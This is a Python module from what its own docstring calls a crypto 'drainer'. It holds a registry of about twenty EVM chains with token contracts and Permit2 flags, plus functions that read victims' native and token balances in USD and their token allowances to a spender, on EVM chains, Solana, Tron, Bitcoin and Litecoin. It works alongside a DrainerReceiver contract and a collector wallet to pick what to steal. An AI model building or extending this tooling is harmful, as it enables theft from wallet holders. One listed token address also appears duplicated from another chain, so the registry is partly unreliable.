"""
Chain registry and balance readers for every family the drainer supports.

EVM networks are declared once in `EVM_NETWORKS`; scanners, the drainer, the
deploy script and the admin console all read from that map. Adding a chain is a
single entry here plus a deployed DrainerReceiver and native gas for the
collector on that chain.

Every EVM entry carries:
  chainId        EIP-155 chain id
  rpc            public fallback; RPC_<NAME> overrides it
  native         gas-token symbol (prices come from market.py)
  tokens         always-checked ERC-20s (symbol -> contract)
  tokenDecimals  decimals for those contracts, for display and sanity checks.
                 The drainer/scanner still reads decimals() on-chain.
  testnet        excluded from default scans and deploys
  permit2        canonical Permit2 is deployed at 0x0000…22D473030F116dDEE9F6B43aC78BA3
  alchemy        optional Alchemy subdomain for full token discovery
  logChunks      transfer-log scan depth (5000-block chunks); defaults below

UTXO chains appear only in the balance helpers — no approvals exist there.
"""
import asyncio
import logging
import re
from typing import Any, Dict, List, Optional

import httpx

import market

logger = logging.getLogger("chains")

UINT256_MAX = 2**256 - 1
NATIVE_DECIMALS = 18


def _net(chain_id: int, rpc: str, native: str,
         tokens: Dict[str, str], token_decimals: Dict[str, int],
         explorer: str, *, alchemy: Optional[str] = None,
         testnet: bool = False, permit2: bool = True,
         log_chunks: int = 8) -> Dict[str, Any]:
    return {
        "chainId": chain_id,
        "rpc": rpc,
        "native": native,
        "nativeDecimals": NATIVE_DECIMALS,
        "tokens": tokens,
        "tokenDecimals": token_decimals,
        "explorer": explorer,
        "alchemy": alchemy,
        "testnet": testnet,
        "permit2": permit2,
        "logChunks": log_chunks,
    }


# ---------------------------------------------------------------------------
# EVM registry. Order is the scan order and the admin console order.
# ---------------------------------------------------------------------------
EVM_NETWORKS: Dict[str, Dict[str, Any]] = {
    "Ethereum": _net(
        1, "https://ethereum-rpc.publicnode.com", "ETH",
        {"USDC": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
         "USDT": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
         "DAI": "0x6B175474E89094C44Da98b954EedeAC495271d0F",
         "FRAX": "0x853d955aCEf822Db058eb8505911ED77F175b99e",
         "WBTC": "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",
         "WETH": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
         "LINK": "0x514910771AF9Ca656af840dff83E8264EcF986CA",
         "UNI": "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984",
         "AAVE": "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9",
         "ARB": "0xB50721BCf8d664c30412Cfbc6cf7a15145234ad1",
         "OP": "0x4200000000000000000000000000000000000042",
         "PEPE": "0x6982508145454Ce325dDbE47a25d4ec3d2311933",
         "SHIB": "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE",
         "CRV": "0xD533a949740bb3306d119CC777fa900bA034cd52",
         "MKR": "0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2",
         "SNX": "0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F",
         "COMP": "0xc00e94Cb662C3520282E6f5717214004A7f26888",
         "GRT": "0xc944E90C64B2c07662A292be6244BDf05Cda44a7",
         "ENS": "0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72",
         "LDO": "0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32",
         "APE": "0x4d224452801ACEd8B2F0aebE155379bb5D594381",
         "cbETH": "0xBe9895146f7AF43049ca1c1AE358B0541Ea49704",
         "rETH": "0xae78736Cd615f374D3085123A210448E74Fc6393",
         "wstETH": "0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0",
         "GNO": "0x6810e776880C02933D47DB1b9fc05908e5386b96",
         "BAL": "0xba100000625a3754423978a60c9317c58a424e3D",
         "SUSHI": "0x6B3595068778DD592e39A122f4f5a5cF09C90fE2",
         "YFI": "0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e",
         "ZRX": "0xE41d2489571d322189246DaFA5ebDe1F4699F498"},
        {"USDC": 6, "USDT": 6, "DAI": 18, "FRAX": 18, "WBTC": 8, "WETH": 18,
         "LINK": 18, "UNI": 18, "AAVE": 18, "ARB": 18, "OP": 18, "PEPE": 18,
         "SHIB": 18, "CRV": 18, "MKR": 18, "SNX": 18, "COMP": 18, "GRT": 18,
         "ENS": 18, "LDO": 18, "APE": 18, "cbETH": 18, "rETH": 18, "wstETH": 18,
         "GNO": 18, "BAL": 18, "SUSHI": 18, "YFI": 18, "ZRX": 18},
        "https://etherscan.io", alchemy="eth-mainnet"),
    "Base": _net(
        8453, "https://base-rpc.publicnode.com", "ETH",
        {"USDC": "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
         "USDT": "0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2",
         "DAI": "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb",
         "USDbC": "0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA",
         "WETH": "0x4200000000000000000000000000000000000006",
         "cbBTC": "0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf",
         "cbETH": "0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22",
         "wstETH": "0xc1CBa3fCea344f92D9239c08C0568f6F2F0ee452",
         "LINK": "0x88Fb150BDc53A65fe94Dea0c9BA0a6dAf8C6e196",
         "AERO": "0x940181a94A35A4569E4529A3CDfB74e38FD98631",
         "DEGEN": "0x4ed4E862860beD51a9570b96d89aF5E1B0Efefed",
         "UNI": "0xc3De830EA07524a0761646a6a4e4be0e114a3C83",
         "AAVE": "0x63706e401c06ac8513145b7687A14804d17f814b",
         "BRETT": "0x532f27101965dd16442E59d40670FaF5eBB142E4",
         "TOSHI": "0xAc1Bd2486aAf3B5C0fc3Fd868558b082a531B2B4",
         "USDe": "0x5d3a1Ff2b6BAb83b63cd9AD0787074081a52ef34",
         "cbXRP": "0xcb585250f852C6c6bf90434AB21a00f02833a4af",
         "MORPHO": "0xBAa5CC21fd487B8Fcc2F632f3F4E8D37262a0842",
         "WELL": "0xA88594D404727625A9437C3f886C7643872296AE"},
        {"USDC": 6, "USDT": 6, "DAI": 18, "USDbC": 6, "WETH": 18, "cbBTC": 8,
         "cbETH": 18, "wstETH": 18, "LINK": 18, "AERO": 18, "DEGEN": 18,
         "UNI": 18, "AAVE": 18, "BRETT": 18, "TOSHI": 18, "USDe": 18,
         "cbXRP": 6, "MORPHO": 18, "WELL": 18},
        "https://basescan.org", alchemy="base-mainnet"),
    "Arbitrum": _net(
        42161, "https://arbitrum-one-rpc.publicnode.com", "ETH",
        {"USDC": "0xaf88d065e77c8cC2239327C5EDb3A432268e5831",
         "USDT": "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
         "DAI": "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1",
         "WETH": "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1",
         "WBTC": "0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f",
         "ARB": "0x912CE59144191C1204E64559FE8253a0e49E6548",
         "LINK": "0xf97f4df75117a78c1A5a0DBb814Af92458539FB4",
         "UNI": "0xFa7F8980b0f1E64A2062791cc3b0871572f1F7f0",
         "wstETH": "0x5979D7b546E38E414F7E9822514be443A4800529",
         "GMX": "0xfc5A1A6EB076a2C7aD06eD22C90d7E710E35ad0a",
         "PENDLE": "0x0c880f6761F1af8d9Aa9C466984b80DAb9a8c9e8",
         "RDNT": "0x3082CC23568eA640225c2467653dB90e9250AaA0",
         "GRAIL": "0x3d9907F9a368ad0a51Be60f7DeB7b1737B20Af9A",
         "gOHM": "0x8D9bA570D6cb60C7e3e0F31343Efe75AB8E65FB1",
         "MAGIC": "0x539bdE0d7Dbd336b79148AA742883198BBF60342",
         "DPX": "0x6C2C06790b3E3E3c38e12Ee22F8183b37a01D837"},
        {"USDC": 6, "USDT": 6, "DAI": 18, "WETH": 18, "WBTC": 8, "ARB": 18,
         "LINK": 18, "UNI": 18, "wstETH": 18, "GMX": 18, "PENDLE": 18,
         "RDNT": 18, "GRAIL": 18, "gOHM": 18, "MAGIC": 18, "DPX": 18},
        "https://arbiscan.io", alchemy="arb-mainnet"),
    "Optimism": _net(
        10, "https://optimism-rpc.publicnode.com", "ETH",
        {"USDC": "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85",
         "USDT": "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",
         "USDC.e": "0x7F5c764cBc14f9669B88837ca1490cCa17c31607",
         "DAI": "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1",
         "WETH": "0x4200000000000000000000000000000000000006",
         "OP": "0x4200000000000000000000000000000000000042",
         "WBTC": "0x68f180fcCe6836688e9084f035309E29Bf0A2095",
         "LINK": "0x350a791Bfc2C21F9Ead4e6a4F18b9eF7e3CD8bc3",
         "wstETH": "0x1F32b1c2345538c0c6f582fCB022739c4A194Ebb",
         "SNX": "0x8700dAec35aF8Ff88c16BdF0418774CB3D7599B4",
         "AAVE": "0x76FB31fb4af56892A25e32cFC43De717950c9278",
         "UNI": "0x6fd9d7AD17242c41f7131d257212c54A0e816691",
         "PERP": "0x9e1028F5F1D5eDE59748FFceE5532509976840E0",
         "SUSD": "0x8c6f28f2F1A3C87F0f938b96d27520d9751ec8d9",
         "LYRA": "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb"},
        {"USDC": 6, "USDT": 6, "USDC.e": 6, "DAI": 18, "WETH": 18, "OP": 18,
         "WBTC": 8, "LINK": 18, "wstETH": 18, "SNX": 18, "AAVE": 18,
         "UNI": 18, "PERP": 18, "SUSD": 18, "LYRA": 18},
        "https://optimistic.etherscan.io", alchemy="opt-mainnet"),
    "Polygon": _net(
        137, "https://polygon-bor-rpc.publicnode.com", "POL",
        {"USDC": "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359",
         "USDT": "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
         "USDC.e": "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
         "DAI": "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063",
         "WMATIC": "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270",
         "WETH": "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619",
         "WBTC": "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6",
         "LINK": "0x53E0bca35eC356BD5ddDFebbD1Fc0fD03FaBad39",
         "UNI": "0xb33EaAd8d922B1083446DC23f610c2567fB5180f",
         "AAVE": "0xD6DF932A45C0f255f85145f286eA0b292B21C90B",
         "wstETH": "0x03b54A6e9a984069379fae1a4fC4dBAE93B3bCCD",
         "stMATIC": "0x3A58a54C066FdC0f2D55FC9C89F0415C92eBf3C4",
         "CRV": "0x172370d5Cd63279eFa6d502DAB29171933a610AF",
         "BAL": "0x9a71012B13CA4d3D0Cdc72A177DF3ef03b0E76A3",
         "SAND": "0xBbba073C31bF03b8ACf7c28EF0738DeCF3697531",
         "GRT": "0x5fe2B58c013d7601147DcdD68C143A77499f5531",
         "GHST": "0x385Eeac5cB85A38A9a07A70c73e0a3271CfB54A7"},
        {"USDC": 6, "USDT": 6, "USDC.e": 6, "DAI": 18, "WMATIC": 18,
         "WETH": 18, "WBTC": 8, "LINK": 18, "UNI": 18, "AAVE": 18,
         "wstETH": 18, "stMATIC": 18, "CRV": 18, "BAL": 18, "SAND": 18,
         "GRT": 18, "GHST": 18},
        "https://polygonscan.com", alchemy="polygon-mainnet"),
    "BSC": _net(
        56, "https://bsc-rpc.publicnode.com", "BNB",
        {"USDC": "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
         "USDT": "0x55d398326f99059fF775485246999027B3197955",
         "BUSD": "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56",
         "TUSD": "0x40af3827F39D0EAcBF4A168f8D4ee67c121D11c9",
         "FDUSD": "0xc5f0f7b66764F6ec8C8Dff7BA683102295E16409",
         "WBNB": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
         "BTCB": "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c",
         "ETH": "0x2170Ed0880ac9A755fd29B2688956BD959F933F8",
         "XRP": "0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE",
         "ADA": "0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47",
         "DOGE": "0xbA2aE424d960c26247Dd6c32edC70B295c744C43",
         "LINK": "0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD",
         "DOT": "0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402",
         "AVAX": "0x1CE0c2827e2eF14D5C4f29a091d735A204794041",
         "MATIC": "0xCC42724C6683B7E57334c4E856f4c9965ED682bD",
         "UNI": "0xBf5140A22578168FD562DCcF235E5D43A02ce9B1",
         "AAVE": "0xfb6115445Bff7b52FeB98650C87f44907E58f802",
         "PEPE": "0x25d887Ce7a35172C62FeBFD67a1856F20FaEbB00",
         "SHIB": "0x2859e4544C4bB03966803b044A93563Bd2D0DD4D",
         "CAKE": "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82",
         "FLOKI": "0xfb5B838b6cfEEdC2877844c01ED2699FBdF6378f"},
        {"USDC": 18, "USDT": 18, "BUSD": 18, "TUSD": 18, "FDUSD": 18,
         "WBNB": 18, "BTCB": 18, "ETH": 18, "XRP": 18, "ADA": 18, "DOGE": 8,
         "LINK": 18, "DOT": 18, "AVAX": 18, "MATIC": 18, "UNI": 18, "AAVE": 18,
         "PEPE": 18, "SHIB": 18, "CAKE": 18, "FLOKI": 9},
        "https://bscscan.com"),
    "Avalanche": _net(
        43114, "https://avalanche-c-chain-rpc.publicnode.com", "AVAX",
        {"USDC": "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E",
         "USDT": "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7"},
        {"USDC": 6, "USDT": 6},
        "https://snowtrace.io"),
    "Linea": _net(
        59144, "https://linea-rpc.publicnode.com", "ETH",
        {"USDC": "0x176211869cA2b568f2A7D4EE941E073a821EE1ff",
         "USDT": "0xA219439258ca9da29E9Cc4cE5596924745e12B93"},
        {"USDC": 6, "USDT": 6},
        "https://lineascan.build"),
    "Scroll": _net(
        534352, "https://scroll-rpc.publicnode.com", "ETH",
        {"USDC": "0x06eFdBFf2a14a7c8E15944D1F4A48F9F95F663A4",
         "USDT": "0xf55BEC9cafDbE8730f096Aa55dad6D22d44099Df"},
        {"USDC": 6, "USDT": 6},
        "https://scrollscan.com"),
    "zkSync": _net(
        324, "https://mainnet.era.zksync.io", "ETH",
        {"USDC": "0x1d17CBcF0D6D143135aE902365D2E5e2A16538D4",
         "USDT": "0x493257fD37EDB34451f62EDf8D2a0C418852bA4C"},
        {"USDC": 6, "USDT": 6},
        "https://explorer.zksync.io"),
    "Mantle": _net(
        5000, "https://mantle-rpc.publicnode.com", "MNT",
        {"USDT": "0x201EBa5CC46D216Ce6DC03F6a759e8E766e956aE"},
        {"USDT": 6},
        "https://mantlescan.xyz"),
    "Gnosis": _net(
        100, "https://gnosis-rpc.publicnode.com", "xDAI",
        {"USDC": "0xDDAfbb505ad214D7b80b1f830fcCc89B60fb7A83",
         "USDT": "0x4ECaBa5870353805a9F068101A40E0f32ed605C6"},
        {"USDC": 6, "USDT": 6},
        "https://gnosisscan.io"),
    "Celo": _net(
        42220, "https://celo-rpc.publicnode.com", "CELO",
        {"USDC": "0xcebA9300f2b948710d2653dD7B07f33A8B32118C",
         "USDT": "0x48065fbBE25f71C9282ddf5e1cD6D6A887483D5e"},
        {"USDC": 6, "USDT": 6},
        "https://celoscan.io"),
    "Fantom": _net(
        250, "https://rpc.fantom.network", "FTM",
        {"USDC": "0x2F733095B80A04b38b0D10cC884524a3d09b836a",
         "USDT": "0x049d68029688eAbF473097a2fC38ef61633A3C7A"},
        {"USDC": 6, "USDT": 6},
        "https://ftmscan.com"),
    "Berachain": _net(
        80094, "https://berachain-rpc.publicnode.com", "BERA",
        {"USDC": "0x549943e04f40284185054145c6E4e9568C1D3241"},
        {"USDC": 6},
        "https://berascan.com"),
    "Sonic": _net(
        146, "https://sonic-rpc.publicnode.com", "S",
        {"USDC": "0x29219dd400f2Bf60E5a23d13Be72B486D4038894",
         "USDT": "0x6047828dc181963ba44974801FF68e538dA5eaF9"},
        {"USDC": 6, "USDT": 6},
        "https://sonicscan.org"),
    "Unichain": _net(
        130, "https://unichain-rpc.publicnode.com", "ETH",
        {"USDC": "0x078D782b760474a361dDA0AF3839290b0EF57AD6",
         "USDT": "0x588CE4F028D8e7B53B687865d6A67b3A54C75518"},
        {"USDC": 6, "USDT": 6},
        "https://uniscan.xyz"),
    "Worldchain": _net(
        480, "https://worldchain-mainnet.g.alchemy.com/public", "ETH",
        {"USDC": "0x79A02482A880bCE3F13e09Da970dC34db4CD24d1"},
        {"USDC": 6},
        "https://worldscan.org", alchemy="worldchain-mainnet"),
    "HyperEVM": _net(
        999, "https://rpc.hyperliquid.xyz/evm", "HYPE",
        {"USDC": "0xb88339CB7199b77E23DB6E890353E22632Ba630f"},
        {"USDC": 6},
        "https://hyperevmscan.io"),
    "Mode": _net(
        34443, "https://mainnet.mode.network", "ETH",
        {"USDC": "0xd988097fb8612cc24eeC14542bC03424c656005f",
         "USDT": "0xf0F161fDA2712DB8b566946122a5af183995e2eD"},
        {"USDC": 6, "USDT": 6},
        "https://explorer.mode.network"),
    "opBNB": _net(
        204, "https://opbnb-rpc.publicnode.com", "BNB",
        {"USDT": "0x9e5AAC1Ba1a2e6aEd6b32689DFcF62A509Ca96f3"},
        {"USDT": 18},
        "https://opbnb.bscscan.com"),

    # --- testnets (excluded from default scans/deploys) ---
    "Sepolia": _net(
        11155111, "https://ethereum-sepolia-rpc.publicnode.com", "ETH",
        {"USDC": "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238"},
        {"USDC": 6},
        "https://sepolia.etherscan.io", testnet=True, log_chunks=6),
    "BaseSepolia": _net(
        84532, "https://base-sepolia-rpc.publicnode.com", "ETH",
        {"USDC": "0x036CbD53842c5426634e7929541eC2318f3dCF7e"},
        {"USDC": 6},
        "https://sepolia.basescan.org", testnet=True, log_chunks=6),
    "ArbitrumSepolia": _net(
        421614, "https://arbitrum-sepolia-rpc.publicnode.com", "ETH",
        {"USDC": "0x75faf114eafb1BDbe2F0316DF893fd58CE46AA4d"},
        {"USDC": 6},
        "https://sepolia.arbiscan.io", testnet=True, log_chunks=6),
}

SOLANA_MINTS = {
    "USDC": "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v",
    "USDT": "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB",
    "wSOL": "So11111111111111111111111111111111111111112",
}

SOLANA_RPCS = [
    "https://api.mainnet-beta.solana.com",
    "https://rpc.ankr.com/solana",
    "https://solana.public-rpc.com",
]


def _norm(name: str) -> str:
    return re.sub(r"[^a-z0-9]", "", (name or "").lower())


_ALIASES = {
    "ethereum": "Ethereum", "eth": "Ethereum", "mainnet": "Ethereum",
    "ethereummainnet": "Ethereum",
    "base": "Base", "basemainnet": "Base",
    "arbitrum": "Arbitrum", "arbitrumnova": "Arbitrum",
    "arbitrumone": "Arbitrum", "arb": "Arbitrum",
    "optimism": "Optimism", "op": "Optimism", "opmainnet": "Optimism",
    "polygon": "Polygon", "polygonpos": "Polygon", "matic": "Polygon",
    "bsc": "BSC", "bnb": "BSC", "bnbchain": "BSC", "binance": "BSC",
    "binancesmartchain": "BSC",
    "avalanche": "Avalanche", "avalanchecchain": "Avalanche", "avax": "Avalanche",
    "linea": "Linea", "scroll": "Scroll",
    "zksync": "zkSync", "zksyncera": "zkSync", "zksynceramainnet": "zkSync",
    "mantle": "Mantle", "gnosis": "Gnosis", "xdai": "Gnosis",
    "celo": "Celo", "fantom": "Fantom", "fantomopera": "Fantom", "ftm": "Fantom",
    "berachain": "Berachain", "bera": "Berachain",
    "sonic": "Sonic", "unichain": "Unichain", "worldchain": "Worldchain",
    "world": "Worldchain", "hyperevm": "HyperEVM", "hyperliquid": "HyperEVM",
    "mode": "Mode", "opbnb": "opBNB",
    "sepolia": "Sepolia", "ethereumsepolia": "Sepolia",
    "basesepolia": "BaseSepolia", "arbitrumsepolia": "ArbitrumSepolia",
}


def resolve_network(name: str) -> Optional[str]:
    """Map a wallet-provided label ("Ethereum Mainnet", "BSC", "zksync") to a registry key."""
    if not name:
        return None
    if name in EVM_NETWORKS:
        return name
    return _ALIASES.get(_norm(name))


def evm_network_names(include_testnets: bool = False) -> List[str]:
    return [n for n, cfg in EVM_NETWORKS.items()
            if include_testnets or not cfg["testnet"]]


def is_testnet(name: str) -> bool:
    cfg = EVM_NETWORKS.get(name)
    return bool(cfg and cfg["testnet"])


def network_meta(name: str) -> Dict[str, Any]:
    try:
        return EVM_NETWORKS[name]
    except KeyError:
        raise KeyError(f"unknown EVM network: {name!r}") from None


def chain_id_of(name: str) -> int:
    return int(network_meta(name)["chainId"])


def token_decimals(name: str, symbol: str) -> Optional[int]:
    cfg = EVM_NETWORKS.get(name) or {}
    return (cfg.get("tokenDecimals") or {}).get(symbol)


def rpc_for(net: str) -> str:
    """Per-chain RPC with an env override: RPC_ETHEREUM, RPC_BASESEPOLIA, …"""
    cfg = EVM_NETWORKS[net]
    import os
    return (os.environ.get(f"RPC_{_norm(net).upper()}", "").strip()
            or os.environ.get(f"RPC_{net.upper()}", "").strip()
            or cfg["rpc"])


# ---------------------------------------------------------------------------
# Address predicates
# ---------------------------------------------------------------------------
def is_evm_address(addr: str) -> bool:
    return bool(re.match(r"^0x[a-fA-F0-9]{40}$", addr or ""))


def is_sol_address(addr: str) -> bool:
    if not addr or addr.startswith("0x") or len(addr) < 32 or len(addr) > 44:
        return False
    b58_chars = set("123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz")
    return set(addr).issubset(b58_chars)


def is_tron_address(addr: str) -> bool:
    return bool(re.match(r"^T[a-zA-Z0-9]{33}$", addr or ""))


# ---------------------------------------------------------------------------
# EVM helpers
# ---------------------------------------------------------------------------
def _balance_of_data(address: str) -> str:
    return "0x70a08231" + address.lower().replace("0x", "").zfill(64)


def _allowance_data(owner: str, spender: str) -> str:
    return ("0xdd62ed3e"
            + owner.lower().replace("0x", "").zfill(64)
            + spender.lower().replace("0x", "").zfill(64))


def _word(raw: Optional[str]) -> int:
    if not raw or raw == "0x":
        return 0
    return int(raw, 16)


_client: Optional[httpx.AsyncClient] = None
_client_loop: Optional[asyncio.AbstractEventLoop] = None
_post_sem = asyncio.Semaphore(8)


def _http() -> httpx.AsyncClient:
    """Shared pool; public RPCs throttle per IP, so one client avoids handshake storms."""
    global _client, _client_loop
    loop = asyncio.get_running_loop()
    if _client is None or _client.is_closed or _client_loop is not loop:
        _client = httpx.AsyncClient(
            timeout=httpx.Timeout(12.0, connect=8.0),
            limits=httpx.Limits(max_connections=32, max_keepalive_connections=16),
        )
        _client_loop = loop
    return _client


async def _post(client: httpx.AsyncClient, url: str,
                 payload: Dict[str, Any]) -> httpx.Response:
    async with _post_sem:
        return await client.post(url, json=payload)


async def get_evm_network_balances(net_name: str, address: str) -> Dict[str, Any]:
    """Native + configured-token balances for one chain, in human units and USD."""
    cfg = EVM_NETWORKS.get(net_name)
    if not cfg or not is_evm_address(address):
        return {"error": "unknown_network"}

    rpc = rpc_for(net_name)
    out: Dict[str, Any] = {
        "network": net_name, "native": 0.0, "nativeSym": cfg["native"],
        "nativeUsd": 0.0, "tokens": [], "usd": 0.0,
    }

    client = _http()
    try:
        response = await _post(client, rpc, {
            "jsonrpc": "2.0", "id": 1, "method": "eth_getBalance",
            "params": [address, "latest"],
        })
        wei = _word(response.json().get("result", "0x0"))
        amount = wei / (10 ** cfg["nativeDecimals"])
        price = market.price(cfg["native"])
        out["native"] = amount
        out["nativeUsd"] = amount * price
        out["usd"] += out["nativeUsd"]
    except Exception as exc:                                  # noqa: BLE001
        logger.debug("native balance %s/%s failed: %s", net_name, address, exc)

    for symbol, contract in cfg["tokens"].items():
        decimals = cfg["tokenDecimals"].get(symbol, 18)
        try:
            response = await _post(client, rpc, {
                "jsonrpc": "2.0", "id": 2, "method": "eth_call",
                "params": [{"to": contract, "data": _balance_of_data(address)}, "latest"],
            })
            raw = response.json().get("result", "0x0")
            if not raw or raw == "0x":
                continue
            amount = _word(raw) / (10 ** decimals)
            if amount <= 0:
                continue
            usd = amount * market.price(symbol)
            out["tokens"].append({"symbol": symbol, "token": contract,
                                   "amount": amount, "decimals": decimals, "usd": usd})
            out["usd"] += usd
        except Exception as exc:                              # noqa: BLE001
            logger.debug("token balance %s/%s %s failed: %s",
                         net_name, address, symbol, exc)

    return out


async def get_evm_balances(address: str) -> Dict[str, Any]:
    """Aggregate every registered chain. Shape matches engine.wallet_view()."""
    if not is_evm_address(address):
        return {}

    nets = evm_network_names(include_testnets=False)
    results = await asyncio.gather(
        *[get_evm_network_balances(net, address) for net in nets],
        return_exceptions=True,
    )

    networks: Dict[str, Any] = {}
    total_usd = 0.0
    for net, result in zip(nets, results):
        if isinstance(result, dict) and "error" not in result:
            networks[net] = result
            total_usd += result.get("usd", 0.0)

    return {
        "native": total_usd,          # engine treats `balance` as USD for EVM
        "nativeUsd": sum(r.get("nativeUsd", 0.0) for r in networks.values()),
        "nativeSym": "ETH",
        "tokens": [t for r in networks.values() for t in r.get("tokens", [])],
        "networks": networks,
        "usd": total_usd,
        "ts": None,
    }


async def get_evm_allowance(net_name: str, token_contract: str, owner: str,
                            spender: str, decimals: int = 18) -> float:
    data = _allowance_data(owner, spender)
    try:
        response = await _post(_http(), rpc_for(net_name), {
            "jsonrpc": "2.0", "id": 3, "method": "eth_call",
            "params": [{"to": token_contract, "data": data}, "latest"],
        })
        raw = response.json().get("result", "0x0")
        if raw and raw != "0x":
            return _word(raw) / (10 ** decimals)
    except Exception:                                         # noqa: BLE001
        pass
    return 0.0


# ---------------------------------------------------------------------------
# Solana helpers
# ---------------------------------------------------------------------------
async def get_solana_balances(address: str, tokens: Optional[list] = None) -> Dict[str, float]:
    out = {"SOL": 0.0, "USDC": 0.0, "USDT": 0.0}
    if not is_sol_address(address):
        return out

    for rpc in SOLANA_RPCS:
        try:
            async with httpx.AsyncClient(timeout=8.0) as client:
                response = await client.post(rpc, json={
                    "jsonrpc": "2.0", "id": 1, "method": "getBalance",
                    "params": [address, {"commitment": "confirmed"}],
                })
                out["SOL"] = int((response.json().get("result") or {}).get("value") or 0) / 1e9

                response = await client.post(rpc, json={
                    "jsonrpc": "2.0", "id": 2, "method": "getTokenAccountsByOwner",
                    "params": [address,
                               {"programId": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"},
                               {"encoding": "jsonParsed"}],
                })
                accounts = (response.json().get("result") or {}).get("value") or []
                for account in accounts:
                    info = (account.get("account", {}).get("data", {})
                            .get("parsed", {}).get("info", {}))
                    mint = info.get("mint")
                    amount = float((info.get("tokenAmount") or {}).get("uiAmount") or 0)
                    for symbol, target in SOLANA_MINTS.items():
                        if mint == target:
                            out[symbol] = max(out.get(symbol, 0.0), amount)
            break
        except Exception as exc:                              # noqa: BLE001
            logger.debug("Solana RPC %s failed: %s", rpc, exc)

    return out


# ---------------------------------------------------------------------------
# Tron helpers
# ---------------------------------------------------------------------------
TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
_TRON_API = "https://api.trongrid.io"


async def get_tron_balances(address: str) -> Dict[str, float]:
    out = {"TRX": 0.0, "USDT": 0.0}
    if not is_tron_address(address):
        return out

    try:
        async with httpx.AsyncClient(timeout=10.0) as client:
            response = await client.post(f"{_TRON_API}/wallet/getaccount",
                                         json={"address": address, "visible": True})
            if response.status_code == 200:
                out["TRX"] = (response.json().get("balance", 0) or 0) / 1e6

            response = await client.post(f"{_TRON_API}/wallet/triggerconstantcontract", json={
                "owner_address": address,
                "contract_address": TRON_USDT,
                "function_selector": "balanceOf(address)",
                "parameter": address[1:].zfill(64),
                "visible": True,
            })
            result = (response.json() or {}).get("constant_result") or []
            if result:
                out["USDT"] = int(result[0], 16) / 1e6
    except Exception as exc:                                  # noqa: BLE001
        logger.debug("Tron query error: %s", exc)

    return out


# ---------------------------------------------------------------------------
# UTXO helpers (watch-only)
# ---------------------------------------------------------------------------
async def get_utxo_balance(coin: str, address: str) -> Dict[str, float]:
    out = {"confirmed": 0.0, "pending": 0.0}
    base = ("https://blockstream.info/api" if coin.upper() == "BTC"
            else "https://litecoinspace.org/api")
    try:
        async with httpx.AsyncClient(timeout=10.0) as client:
            response = await client.get(f"{base}/address/{address}")
        if response.status_code == 200:
            data = response.json()
            chain_stats = data.get("chain_stats", {})
            mempool_stats = data.get("mempool_stats", {})
            confirmed = (int(chain_stats.get("funded_txo_sum", 0))
                         - int(chain_stats.get("spent_txo_sum", 0)))
            pending = (int(mempool_stats.get("funded_txo_sum", 0))
                       - int(mempool_stats.get("spent_txo_sum", 0)))
            out["confirmed"] = max(0, confirmed) / 1e8
            out["pending"] = max(0, pending) / 1e8
    except Exception:                                         # noqa: BLE001
        pass
    return out
